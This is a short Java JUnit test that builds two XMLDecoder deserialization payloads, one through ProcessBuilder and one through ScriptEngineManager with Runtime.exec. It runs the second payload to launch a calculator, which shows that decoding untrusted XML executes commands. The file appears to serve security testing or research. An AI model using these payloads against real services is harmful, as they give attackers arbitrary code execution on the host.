import org.junit.jupiter.api.Test;

import java.beans.XMLDecoder;
import java.io.ByteArrayInputStream;
import java.util.Base64;

/**
 * @author ReaJason
 * @since 2025/7/3
 */
class XmlDecoderServletTest {

    @Test
    void test() {
        String xml = "<java>" +
                "    <object class=\"java.lang.ProcessBuilder\">\n" +
                "        <array class=\"java.lang.String\" length=\"1\" >\n" +
                "            <void index=\"0\">\n" +
                "                <string>Calculator</string>\n" +
                "            </void>\n" +
                "        </array>\n" +
                "        <void method=\"start\"/>\n" +
                "    </object>\n" +
                "</java>";
        String xml1 = "<java>" +
                "    <object class=\"javax.script.ScriptEngineManager\">\n" +
                "        <void method=\"getEngineByName\">\n" +
                "            <string>js</string>\n" +
                "            <void method=\"eval\">\n" +
                "                <string>java.lang.Runtime.getRuntime().exec('open -a Calculator')</string>\n" +
                "            </void>\n" +
                "        </void>\n" +
                "    </object>\n" +
                "</java>";
        try {
            ByteArrayInputStream inputStream = new ByteArrayInputStream(xml1.getBytes());
            XMLDecoder xmlDecoder = new XMLDecoder(inputStream);
            xmlDecoder.readObject();
            xmlDecoder.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}